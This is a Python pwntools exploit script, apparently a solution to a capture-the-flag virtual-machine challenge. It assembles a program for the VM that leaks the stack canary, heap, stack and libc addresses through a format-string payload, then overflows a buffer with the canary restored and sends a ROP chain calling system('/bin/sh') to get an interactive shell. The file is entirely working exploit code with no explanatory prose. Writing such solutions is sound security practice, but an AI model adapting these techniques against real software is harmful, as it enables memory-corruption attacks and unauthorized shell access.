from pwn import *
from assembler import *

context.arch = 'amd64'
context.bits = 64

PAYLOAD = b"%14$p-%15$p-%16$p-%17$p-%25$p\n"

INS_MAP = {
    "add": 1,
    "sub": 2,
    "mul": 3,
    "div": 4,
    "rstin": 5,
    "rstout": 6,
    "popin": 7,
    "popout": 8,
    "read": 9,
    "write": 10,
    "jmp": 11,
    "njmp": 12,
    "len": 13,
}

ARG_MAP = {
    "add": [4, 4, 4],
    "sub": [4, 4, 4],
    "mul": [4, 4, 4],
    "div": [4, 4, 4],
    "rstin": [],
    "rstout": [],
    "popin": [4, 4],
    "popout": [4, 4],
    "read": [4],
    "write": [4],
    "jmp": [4, 4],
    "njmp": [4, 4],
    "len": [4, 4],
}


PROGRAM = f"""
popout 0, {208+len(PAYLOAD)};
write 0;
read 199;
popin 0, 199;
rstin;
read 199;
popin 198, 199;
mul 309, 309, 308;
add 300, 300, 309;
add 322, 322, 309;
add 323, 323, 309;
add 330, 330, 309;
add 331, 331, 309;
add 338, 338, 309;
add 339, 339, 309;
len 100, 1;
"""

@Instruction.unpack_insn
def do_unpack_insn(mnemonic) -> tuple[int, list[int]]:
    # Return the opcode value (int) and a list of operand sizes (in bits) for this mnemonic
    return INS_MAP[mnemonic], list(map(lambda x: x*8, ARG_MAP[mnemonic]))

@Instruction.compile_insn
def do_compile(opcode, operand_bytes) -> bytes:
    # Convert the opcode into bytes
    return p32(opcode) + operand_bytes


def run_vm(code, memory):
    # p = remote("vm.challs.m0lecon.it", 3333)
    # with open(code, "rb") as f:
    #     p.sendafter(b"Send the code file\n", f.read().strip()+b"ENDOFTHEFILE")
    # with open(memory, "rb") as f:
    #     p.sendafter(b"Send the memory file\n", f.read().strip()+b"ENDOFTHEFILE")
    # p.recvuntil(b"Starting challenge...\n")

    p = process(["./challenge", code, memory])
    heap, canary, stack, binary, libc_leak = map(lambda x: int(x, 16), p.recvline().strip().split(b'-'))
    stack -= 0x1c11
    libc = ELF("./libc.so.6")
    libc.address = libc_leak - 0x29d90

    pop_rdi_ret = next(libc.search(asm("pop rdi ; ret")))
    binsh = next(libc.search(b"/bin/sh"))
    system = libc.symbols['system']

    log.success(f"Leaked canary @ {hex(canary)}")
    log.success(f"Leaked libc @ {hex(libc.address)}")
    log.success(f"Leaked gadget @ {hex(pop_rdi_ret)}")
    log.success(f"Leaked binsh @ {hex(binsh)}")
    log.success(f"Leaked system @ {hex(system)}")

    rop_chain = b""
    rop_chain += p64(pop_rdi_ret)
    rop_chain += p64(binsh)
    rop_chain += p64(pop_rdi_ret+1)
    rop_chain += p64(libc.symbols['system'])
    
    # Padding to reach canary
    data = p8(0xFF)*100
    data += p8(0xFE)*100
    data += p8(0xFD)*100

    # Restore canary
    data += p64(canary)

    # Useful value
    data += p16(0x1010)
    # Padding
    data += p16(0x1234)
    # More padding
    data += p32(0xdeadbeef)
    # ROP
    data += rop_chain

    p.sendline(data)
    p.interactive()

def gen_payload():
    assembler = Assembler(PROGRAM)
    code = assembler.assemble(debug=True)
    return code

def gen_memory():
    memory = b""
    for x in range(208):
        memory += p32(x)
    for x in PAYLOAD:
        memory += p32(x)
    return memory


if __name__ == '__main__':
    payload = gen_payload()
    with open("/tmp/challenge.vm", "wb") as f:
        f.write(payload)
    memory = gen_memory()
    with open("/tmp/memory.vm", "wb") as f:
        f.write(memory)
    run_vm("/tmp/challenge.vm", "/tmp/memory.vm")

